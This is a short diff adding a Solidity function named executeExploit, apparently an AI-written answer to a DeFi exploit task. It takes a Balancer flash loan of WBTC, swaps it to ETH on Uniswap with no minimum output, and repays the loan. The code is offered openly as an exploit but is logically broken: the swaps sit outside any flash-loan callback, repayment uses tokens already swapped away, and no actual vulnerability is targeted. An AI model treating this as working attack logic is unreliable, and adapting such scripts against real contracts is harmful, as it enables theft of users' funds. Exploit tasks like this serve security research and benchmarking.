@@ -1,0 +1,25 @@
+```solidity
+<executeExploitCode>
+    function executeExploit(uint256 amount) internal {
+        // Step 1: Flash loan WBTC (valuableToken)
+        IBalancerVault(flashloanProvider).flashLoan(address(this), tokens, amounts, "");
+
+        // Step 2: Obtain WETH by converting valuableToken to ETH through Uniswap
+        address[] memory path = new address[](2);
+        path[0] = address(valuableToken);
+        path[1] = uniswapRouter.WETH();
+        
+        // Step 3: Swap valuableToken for WETH
+        uint256 amountOutMin = 0; // Set to 0 to avoid swap failure
+        uniswapRouter.swapExactTokensForETH(amount, amountOutMin, path, address(this), block.timestamp);
+
+        // Step 4: Check WETH balance and use it for the flash loan repayment (if necessary)
+        uint256 wethBalance = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+        console.log("WETH Balance after swap: %s", wethBalance);
+        
+        // Step 5: Repay the flash loan
+        IERC20(valuableToken).transfer(flashloanProvider, amount);
+        // Any surplus WETH can stay in the contract for future use.
+    }
+</executeExploitCode>
+```
